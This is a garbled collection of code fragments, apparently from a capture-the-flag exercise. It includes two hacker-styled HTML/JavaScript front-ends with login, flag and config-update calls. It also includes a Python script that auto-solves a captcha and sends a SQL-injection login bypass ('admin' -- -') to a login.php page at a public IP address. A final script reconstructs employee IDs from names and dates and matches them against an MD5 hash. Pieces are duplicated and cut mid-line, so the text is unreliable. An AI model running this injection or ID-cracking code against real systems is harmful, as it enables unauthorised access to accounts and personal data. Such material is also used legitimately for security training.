    <script>
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        const matrixChars = "01010101ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        const fontSize = 14;
        let columns = Math.floor(canvas.width / fontSize);
        let drops = Array(columns).fill(1);

        window.addEventListener('resize', () => {
            columns = Math.floor(canvas.width / fontSize);
            drops = Array(columns).fill(1);
        });

        function drawMatrix() {
            ctx.fillStyle = 'rgba(3, 8, 4, 0.08)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.font = fontSize + "px 'JetBrains Mono', monospace";

            for (let i = 0; i < drops.length; i++) {
                const char = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
                ctx.fillStyle = Math.random() > 0.85 ? '#33ff77' : '#006622';
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.98) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 45);

        async function login() {
            const u = document.getElementById('username').value.trim();
            const p = document.getElementById('password').value.trim();
            const errBox = document.getElementById('error-box');
            errBox.innerHTML = '<span style="color:#00ff66;">[i] Transmitting credentials...</span>';

            try {
                const res = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: u, password: p })
                });
                const data = await res.json();

                if (data.redirect) {
                    window.location.href = data.redirect;
                } else if (data.trace) {
                    errBox.innerHTML = `[!] UNHANDLED_EXCEPTION:<br/><pre>${data.trace}</pre>`;
                } else {
                    errBox.innerText = `[!] ERROR: ${data.error || 'Access Denied.'}`;
                }
            } catch (err) {
                errBox.innerText = "[!] NETWORK_ERROR: Service unreachable.";
            }
        }

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') login();
        });
    </script>
</body>

        const fontSize = 14;
        let columns = Math.floor(canvas.width / fontSize);
        let drops = Array(columns).fill(1);

        window.addEventListener('resize', () => {
            columns = Math.floor(canvas.width / fontSize);
            drops = Array(columns).fill(1);
        });

        function drawMatrix() {
            ctx.fillStyle = 'rgba(3, 8, 4, 0.08)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.font = fontSize + "px 'JetBrains Mono', monospace";

            for (let i = 0; i < drops.length; i++) {
                const char = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
                ctx.fillStyle = Math.random() > 0.85 ? '#33ff77' : '#006622';
                ctx.fillText(char, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.98) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 45);

        async function getFlag() {
            const out = document.getElementById('flag-out');
            out.innerText = "> Sending authorization handshake to /api/flag...";
            try {
                const res = await fetch('/api/flag');
                const data = await res.json();
                out.innerText = "> RESPONSE:\n" + JSON.stringify(data, null, 2);
            } catch (e) {
                out.innerText = "> COMMUNICATION_FAILURE: Endpoint unreachable.";
            }
        }

        async function syncConfig() {
            const out = document.getElementById('sync-out');
            out.innerText = "> Transmitting payload to /api/update...";
            try {
                const raw = document.getElementById('json-input').value;
                const payload = JSON.parse(raw);
                const res = await fetch('/api/update', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                out.innerText = "> SERVER_RESPONSE (" + res.status + "):\n" + JSON.stringify(data, null, 2);
            } catch (err) {
                out.innerText = "> PARSE_ERROR: Invalid JSON structure provided in input buffer.";
            }
        }
    </script>
</body>

import requests
import re

s = requests.Session()

# Fetch login page fresh to get session cookie + current captcha challenge
r = s.get('http://13.201.205.33/login.php')
m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
if not m:
    print("Couldn't find captcha numbers, dumping snippet:")
    print(r.text[r.text.find('captcha-challenge')-50:r.text.find('captcha-challenge')+200])
else:
    a, b = int(m.group(1)), int(m.group(2))
    answer = a + b
    print(f"Captcha: {a} + {b} = {answer}")

    payload = {
        "username": "admin' -- -",
        "password": "x",
        "captcha": str(answer)
    }
    r2 = s.post('http://13.201.205.33/login.php', data=payload, allow_redirects=False)
    print("Status:", r2.status_code)
    print("Location header:", r2.headers.get('Location'))
    print(r2.text[:500])
EOF

    if matches:
        print(pattern, "->", matches[:5])

└─$ python3 << 'EOF'
import hashlib

def make_id(first_name, birth_month, joining_date):
    prefix = first_name[:3].lower()
    month = str(birth_month).zfill(2)
    joined = joining_date.replace('-', '')
    raw = prefix + month + joined
    return raw, hashlib.md5(raw.encode()).hexdigest()

# Verify against Priya: September (09), joined 2019-09-06
raw, h = make_id("Priya", 9, "2019-09-06")
print("Priya check:", raw, h, "MATCH" if h == "ac662960d5e262cfd3400bf35ce4813b" else "NO MATCH")

# Arjun Mehta: November (11), joined 2021-03-18
raw2, h2 = make_id("Arjun", 11, "2021-03-18")
print("Arjun:", raw2, h2)
EOF
